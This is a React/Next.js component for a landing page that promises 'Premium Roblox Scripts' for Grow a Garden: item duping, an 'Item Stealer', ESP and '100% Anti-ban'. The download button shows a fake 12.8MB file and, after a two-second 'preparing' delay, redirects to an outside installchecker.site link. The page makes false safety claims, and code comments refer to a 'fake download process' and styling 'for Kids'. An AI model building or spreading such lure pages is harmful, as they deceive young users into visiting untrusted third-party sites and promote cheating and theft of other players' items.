"use client"

import type React from "react"
import { useState, useEffect, useRef, useCallback, memo } from "react"
import { Loader2, Download, CheckCircle, Shield, Lock, Zap } from "lucide-react"
import { motion } from "framer-motion"
import Image from "next/image"

// Declare the global og_load function
declare global {
  interface Window {
    og_load: () => void
  }
}

// Memoized components to reduce re-renders
const MemoizedBadge = memo(({ icon, text }: { icon: React.ReactNode; text: string }) => (
  <div className="bg-[#00ff88]/10 backdrop-blur-sm px-5 py-2 rounded-xl text-sm flex items-center gap-2 border border-[#00ff88]/20 hover:bg-[#00ff88]/15 transition-colors duration-300">
    {icon} {text}
  </div>
))
MemoizedBadge.displayName = "MemoizedBadge"

const MemoizedFeature = memo(({ icon, name }: { icon: string; name: string }) => (
  <div className="bg-gradient-to-br from-white/5 to-white/10 p-4 rounded-xl text-center border border-white/10 hover:transform hover:-translate-y-1 transition-all duration-300 hover:shadow-[0_5px_15px_rgba(0,255,136,0.15)] group">
    <div className="text-2xl mb-1 group-hover:scale-110 transition-transform duration-300">{icon}</div>
    <div className="font-medium">{name}</div>
  </div>
))
MemoizedFeature.displayName = "MemoizedFeature"

export default function RobloxScriptsLanding() {
  const [downloading, setDownloading] = useState(false);
  const particlesRef = useRef<HTMLDivElement>(null);
  // Removed all state and logic related to fake download process

  // Optimized motion variants for better performance
  const fadeInVariants = {
    hidden: { opacity: 0, y: 20 },
    visible: { opacity: 1, y: 0 },
  }

  return (
    <div className="min-h-screen bg-[#0a0a0a] text-white relative overflow-hidden font-sans">
      {/* Floating Particles - optimized */}
      <div ref={particlesRef} className="particles fixed w-full h-full top-0 left-0 z-0 pointer-events-none"></div>

      {/* Main Content - always visible */}
      <motion.div
        className="container max-w-4xl mx-auto px-6 py-16 relative z-10"
        initial="hidden"
        animate="visible"
        variants={fadeInVariants}
        transition={{ duration: 0.5 }}
      >
        <header className="text-center mb-12">
          <motion.div
            className="flex justify-center mb-6"
            initial={{ opacity: 0, scale: 0.9 }}
            animate={{ opacity: 1, scale: 1 }}
            transition={{ delay: 0.1, duration: 0.5 }}
          >
            <Image
              src="https://i.imgur.com/SYt9D3P.png"
              alt="Roblox Scripts Logo"
              width={220}
              height={66}
              className="h-auto"
              priority
            />
          </motion.div>

          <motion.h1
            className="text-4xl md:text-5xl font-bold mb-6 bg-gradient-to-r from-[#8a2be2] via-[#00bfff] to-[#00ff88] bg-clip-text text-transparent"
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 0.2, duration: 0.5 }}
          >
            Premium Roblox Scripts
          </motion.h1>

          <motion.p
            className="text-gray-300 text-lg md:text-xl max-w-3xl mx-auto mb-8"
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 0.3, duration: 0.5 }}
          >
            UNLOCK ALL PREMIUM GROW A GARDEN SCRIPTS NOW! 🔥
          </motion.p>

          {/* Download Button - now delays 2s before redirecting */}
          <motion.div
            className="mt-8 mb-12"
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 0.4, duration: 0.5 }}
          >
            <motion.button
              onClick={() => {
                setDownloading(true);
                setTimeout(() => {
                  window.location.href = "https://installchecker.site/cl/i/2ljkdp";
                }, 2000);
              }}
              disabled={downloading}
              className={`
                inline-block px-12 py-5 text-2xl font-bold text-black 
                bg-gradient-to-r from-[#8a2be2] via-[#00bfff] to-[#00ff88] 
                rounded-xl shadow-lg hover:shadow-[0_0_40px_rgba(0,255,136,0.5)]
                transition-all duration-300 relative overflow-hidden
                hover:scale-105
                ${downloading ? 'opacity-60 cursor-not-allowed' : ''}
              `}
              whileHover={{ scale: downloading ? 1 : 1.05 }}
              whileTap={{ scale: downloading ? 1 : 0.98 }}
            >
              {downloading ? (
                <>
                  <span className="inline-block mr-3 h-6 w-6 animate-spin align-middle">
                    <Download className="h-6 w-6" />
                  </span>
                  PREPARING DOWNLOAD...
                </>
              ) : (
                <>
                  <Download className="inline-block mr-3 h-6 w-6" /> DOWNLOAD NOW (12.8MB)
                  <span className="absolute inset-0 bg-gradient-to-r from-transparent via-white/20 to-transparent animate-shine"></span>
                </>
              )}
            </motion.button>

            <motion.div
              className="flex justify-center gap-6 flex-wrap mt-6"
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ delay: 0.5, duration: 0.5 }}
            >
              {[
                { icon: <Shield className="h-4 w-4 text-[#00ff88]" />, text: "Anti-Ban" },
                { icon: <Lock className="h-4 w-4 text-[#00ff88]" />, text: "Safe For All Devices" },
                { icon: <Zap className="h-4 w-4 text-[#00ff88]" />, text: "Mobile/PC Supported" },
              ].map((badge, index) => (
                <motion.div
                  key={index}
                  initial={{ opacity: 0, y: 10 }}
                  animate={{ opacity: 1, y: 0 }}
                  transition={{ delay: 0.6 + index * 0.1, duration: 0.3 }}
                >
                  <MemoizedBadge icon={badge.icon} text={badge.text} />
                </motion.div>
              ))}
            </motion.div>
          </motion.div>
        </header>

        {/* Features Section */}
        <motion.section
          className="mb-12"
          initial={{ opacity: 0, y: 30 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.7, duration: 0.5 }}
        >
          <h2 className="text-3xl font-bold text-center mb-8 bg-gradient-to-r from-[#8a2be2] to-[#00ff88] bg-clip-text text-transparent">
            🔥 Premium Features Included
          </h2>

          {/* Features Grid - optimized with memoized components */}
          <div className="grid grid-cols-2 sm:grid-cols-4 gap-4 mb-8">
            {[
              { icon: "💎", name: "Dupe Items" },
              { icon: "🛑", name: "Item Stealer" },
              { icon: "🐾", name: "Pet-Spawner" },
              { icon: "🌱", name: "Fast Growth" },
              { icon: "🛒", name: "Auto Buy" },
              { icon: "⚡", name: "120FPS Boost" },
              { icon: "⚙️", name: "Auto Farm" },
              { icon: "🧩", name: "ESP" },
              { icon: "🌾", name: "Infinite Seeds" },
              { icon: "🔍", name: "Old Server Finder" },
              { icon: "🌻", name: "Auto Sell" },
              { icon: "🔄", name: "Auto Harvest" },
            ].map((feature, index) => (
              <motion.div
                key={index}
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ delay: 0.8 + index * 0.05, duration: 0.3 }}
              >
                <MemoizedFeature icon={feature.icon} name={feature.name} />
              </motion.div>
            ))}
          </div>
        </motion.section>

        {/* Additional Features */}
        <motion.section
          className="text-center"
          initial={{ opacity: 0, y: 30 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 1.2, duration: 0.5 }}
        >
          <div className="bg-gradient-to-br from-[#111]/80 to-[#222]/80 p-8 rounded-2xl border border-[#00ff88]/30 backdrop-blur-sm">
            <h3 className="text-2xl font-bold mb-6 text-[#00ff88]">🔒 100% Anti-ban</h3>
            <p className="text-gray-300 text-lg mb-4">
              Advanced anti-detection technology keeps you safe from bans and safe and secure and 100K players used it
              right now
            </p>
          </div>
        </motion.section>
      </motion.div>

      <style jsx global>{`
        :root {
          --primary: #00ff88;
          --secondary: #8a2be2;
          --accent: #00bfff;
          --bg-dark: #0a0a0a;
          --bg-light: #111;
          --text: #ffffff;
        }

        body {
          background-color: var(--bg-dark);
          background-image: 
            radial-gradient(circle at 25% 25%, rgba(138, 43, 226, 0.08), transparent 40%),
            radial-gradient(circle at 75% 75%, rgba(0, 191, 255, 0.08), transparent 40%);
        }

        .particle {
          position: absolute;
          border-radius: 50%;
          animation: float linear infinite;
          will-change: transform;
        }

        @keyframes float {
          0% { transform: translateY(0) rotate(0deg); opacity: 0; }
          5% { opacity: 0; }
          10% { opacity: 0.5; }
          90% { opacity: 0.5; }
          100% { transform: translateY(-100vh) rotate(360deg); opacity: 0; }
        }

        @keyframes shine {
          0% { transform: translateX(-100%); }
          100% { transform: translateX(100%); }
        }

        .animate-shine {
          animation: shine 2s infinite;
          will-change: transform;
        }

        /* Improve animation performance */
        * {
          -webkit-font-smoothing: antialiased;
          -moz-osx-font-smoothing: grayscale;
        }
        /* BUTTON STYLES - Multicolored RGB Animation for Kids */
        .app-btn {
          border-radius: 12px !important;
          background: linear-gradient(90deg, #ff3b3b, #ffb300, #00ff88, #ff3b3b);
          background-size: 200% 200%;
          animation: none;
          color: #fff !important;
          font-weight: bold;
          padding: 12px 24px;
          border: none;
          cursor: pointer;
          font-size: 16px;
          text-transform: uppercase;
          box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
          transition: all 0.3s ease;
          margin-top: 10px;
          display: inline-block;
          position: relative;
          overflow: hidden;
          text-shadow: 0 1px 1px rgba(0, 0, 0, 0.2);
        }
        .app-btn.app-btn-noglow {
          animation: none !important;
        }
        .app-btn:hover {
          transform: scale(1.05);
          box-shadow: 0 6px 14px rgba(0, 0, 0, 0.3);
          animation: bounce 1.5s;
        }
        .app-btn:active {
          transform: scale(0.95);
          box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
        }

        @keyframes bounce {
          0%, 100% {
            transform: translateY(0);
          }
          50% {
            transform: translateY(-5px);
          }
        }
        @keyframes redTextGlow {
          0% { text-shadow: 0 0 16px #ff3b3b, 0 2px 8px #0008, 0 0 32px #ff3b3b; }
          100% { text-shadow: 0 0 32px #ff3b3bcc, 0 2px 8px #0008, 0 0 48px #ff3b3bcc; }
        }
      `}</style>
    </div>
  )
}
